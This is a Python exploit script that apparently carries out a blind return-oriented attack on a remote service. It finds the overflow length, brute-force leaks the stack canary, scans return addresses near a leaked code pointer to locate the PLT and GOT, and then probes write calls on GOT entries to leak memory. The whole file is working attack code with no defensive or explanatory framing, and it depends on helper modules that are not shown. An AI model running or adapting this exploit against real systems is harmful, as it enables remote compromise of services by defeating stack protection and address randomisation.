from request import *
from globs import *
from util import *
import binascii
import struct


meta = {}
correspondances = {}
prefix = -1
cookie = ''


def log(C, x, input):
    print(x)
    print("Obtained for input = "+binascii.hexlify(input[32:]))

def test_cookie(C):
    if Glob.prefix == -1:
        return True
    tmp = Request().send_receive(Glob.prefix+Glob.cookie[:4])
    if index_correspondance(tmp>>2) == 0:
        print("[!] Cookie changed or something went wrong, recomputing cookie")
        Glob.recompute = True
        Glob.cookie = ''
        Glob.cookie = leak_cookie(Glob.prefix, 20)
        tmp = Request().send_receive(Glob.prefix+Glob.cookie[:4])
        if index_correspondance(tmp>>2) == 0:
            print("[!!] Something definitively went wrong (cookie is still bad), exiting")
            exit()
        print("[.] Cookie found "+binascii.hexlify(Glob.cookie))
        with open('cookie','wb') as f:
            f.write(Glob.cookie)
    return True

Request.new_request_callback = log
Request.test_cookie_callback = test_cookie


def load_prefix():
    try:
        Glob.prefix = open('prefix','rb').read()
        print("[+] Testing with prefix "+Glob.prefix)
    except:
        print("[+] Finding vulnerable length")
        Glob.prefix = -1
        l = find_length()
        Glob.prefix = '@'*l
        print("[.] Length found : "+str(l))

        with open('prefix','wb') as f:
            f.write(Glob.prefix)


def load_cookie():
    try:
        Glob.cookie = open('cookie','rb').read()
        print("[+] Testing with cookie "+binascii.hexlify(Glob.cookie))
    except:
        print("[+] Finding cookie")
        Glob.cookie = leak_cookie(Glob.prefix, 20)
        print("[.] Cookie found "+binascii.hexlify(Glob.cookie))
        with open('cookie','wb') as f:
            f.write(Glob.cookie)


def find_plt_got(offset_text, m, M, addr_begin, recompute = True):
    if not recompute and not Glob.recompute:
        try:
            open('plt','rb')
            open('got','rb')
        except:
            recompute = True

    if recompute or Glob.recompute:
        global plt
        global got

        # code_addr = Glob.cookie[offset_text:offset_text+4]
        # code_addr_int = struct.unpack('I',code_addr)[0]
        code_addr_int = struct.unpack('I',addr_begin)[0]

        print("[+] Finding PLT and GOT from "+binascii.hexlify(struct.pack('I',code_addr_int+m)[::-1])+" to "+binascii.hexlify(struct.pack('I',code_addr_int+M)[::-1]))

        returnable_addr = []
        for i in range(m,M,4):
            addr = struct.pack('I',code_addr_int+i)
            req = Request()
            to_send = Glob.cookie[:offset_text]+addr+Glob.cookie[offset_text+4:]
            tmp = req.send_receive(Glob.prefix+to_send)
            #print("Got "+str(tmp))
            index = tmp>>2
            exited = (tmp>>1)&1
            crash = tmp&1
            #print("=> "+str(index)+", "+str(exited))
            if index_correspondance(index) > 0 or exited == 0 or crash:
                print(index_correspondance(index),exited,index)
            if index_correspondance(index) > 0:
                returnable_addr.append(code_addr_int+i)
                print("[.] New possible address found at "+binascii.hexlify(addr[::-1])+" at offset "+str(i))

        print("[+] Finding PLT and GOT")

        i = 0
        plt = []
        PLT_begin = False
        PLT_found = False
        while i<len(returnable_addr) and not PLT_found:
            if (returnable_addr[i]+4 and returnable_addr[i]+16 in returnable_addr) or PLT_begin:
                PLT_begin = True
                plt.append(returnable_addr[i])
                if not returnable_addr[i]+16 in returnable_addr:
                    PLT_found = True
            i += 1

        if PLT_found:
            print("[.] PLT has been found at : "+hex(plt[0]))
        else:
            print("[!] PLT has not been found, exiting")
            exit()

        got = []
        GOT_begin = False
        GOT_found = False
        while i<len(returnable_addr) and not GOT_found:
            if ((returnable_addr[i]+16 in returnable_addr and returnable_addr[i]+32 in returnable_addr) or GOT_begin):
                GOT_begin = True
                got.append(returnable_addr[i])
                if not returnable_addr[i]+16 in returnable_addr:
                    GOT_found = True
            i += 1

        if GOT_found:
            print("[.] GOT has been found at : "+hex(got[0]))
        else:
            print("[!] GOT has not been found, exiting")
            exit()

        with open('plt','wb') as f:
            f.write(','.join(plt))
        with open('got','wb') as f:
            f.write(','.join(got))
    else:
        with open('plt','rb') as f:
            plt = []
            plt = f.read().split(',')
        with open('got','rb') as f:
            got = []
            got = f.read().split(',')


def find_write(offset_text):
    global got

    for g in got:
        addr = struct.pack('I',g)
        req = Request()
        tmp = req.send_receive(Glob.prefix+Glob.cookie[:offset_text]+addr+Glob.cookie[offset_text+4:]+"\x04\x00\x00\x00"+addr+"\xff\x00\x00\x00")
        print(Request.get_answer(tmp>>2))


load_prefix()
load_cookie()
find_plt_got(16,-5000,5000,Glob.cookie[8:12],False)
find_write(12)
